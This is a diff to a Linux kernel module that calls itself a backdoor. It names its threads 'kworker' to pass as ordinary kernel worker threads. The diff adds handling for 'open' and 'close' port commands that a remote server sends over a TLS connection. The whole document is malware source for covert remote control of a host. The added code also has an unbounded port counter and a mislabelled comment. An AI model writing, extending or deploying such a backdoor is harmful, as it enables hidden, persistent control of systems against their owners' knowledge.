@@ -39,6 +39,8 @@ struct service* svc;
 struct sock* nl_sk;
 
 unsigned char* buffer;
+u16* open_ports;
+size_t port_count = 0;
 
 int send_msg(struct socket* sock, unsigned char* buf, size_t len);
 int recv_msg(struct socket* sock, unsigned char* buf, size_t len);
@@ -169,9 +171,50 @@ int send_msg(struct socket* sock, unsigned char* buf, size_t len) {
 
 int read_TLS(void) {
     int len;
+    u16 tmp_port;
+    int i;
+    const char* bad_len = "Invalid command length";
+    const char* bad_port = "Invalid port number";
+    const char* cl = "Close not yet implemented";
+    const char* good = "Port is valid";
     while (!kthread_should_stop()) {
+        memset(buffer, 0, MAX_PAYLOAD);
         len = recv_msg(svc->tls_socket, buffer, MAX_PAYLOAD);
         printk(KERN_INFO "Received message from server %*.s\n", len, buffer);
+        if (len < 7) {
+            strcpy(buffer, bad_len);
+            send_msg(svc->tls_socket, buffer, strlen(bad_len));
+            continue;
+        }
+        if (memcmp("open ", buffer, 5) == 0) {
+            //Open a port
+            if (kstrtou16(buffer + 5, 10, &tmp_port)) {
+                printk(KERN_INFO "Bad port c:%c %d\n", buffer[5], tmp_port);
+                strcpy(buffer, bad_port);
+                send_msg(svc->tls_socket, buffer, strlen(bad_port));
+                continue;
+            }
+            printk(KERN_INFO "Good port %u\n", tmp_port);
+            open_ports[port_count] = tmp_port;
+            ++port_count;
+            strcpy(buffer, good);
+            for (i = 0; i < strlen(good); ++i) {
+                printk(KERN_INFO "%c", buffer[i]);
+            }
+            send_msg(svc->tls_socket, buffer, strlen(good));
+        } else if (memcmp("close ", buffer, 6) == 0) {
+            //Open a port
+            if (kstrtou16(buffer + 6, 10, &tmp_port)) {
+                strcpy(buffer, bad_port);
+                send_msg(svc->tls_socket, buffer, strlen(bad_port));
+                continue;
+            }
+            strcpy(buffer, cl);
+            send_msg(svc->tls_socket, buffer, strlen(cl));
+            continue;
+            //open_ports[port_count] = tmp_port;
+            //++port_count;
+        }
     }
     return 0;
 }
@@ -394,6 +437,7 @@ static int __init mod_init(void) {
         return err;
     }
     buffer = kmalloc(MAX_PAYLOAD, GFP_KERNEL);
+    open_ports = kmalloc(2 * 65536, GFP_KERNEL);
 
     svc->read_thread = kthread_run((void*) read_TLS, NULL, "kworker");
     svc->write_thread = kthread_run((void*) write_TLS, NULL, "kworker");
@@ -429,6 +473,9 @@ static void __exit mod_exit(void) {
 
     if (buffer) {
         kfree(buffer);
+    }
+    if (open_ports) {
+        kfree(open_ports);
     }
     printk(KERN_ALERT "removed backdoor module\n");
 }
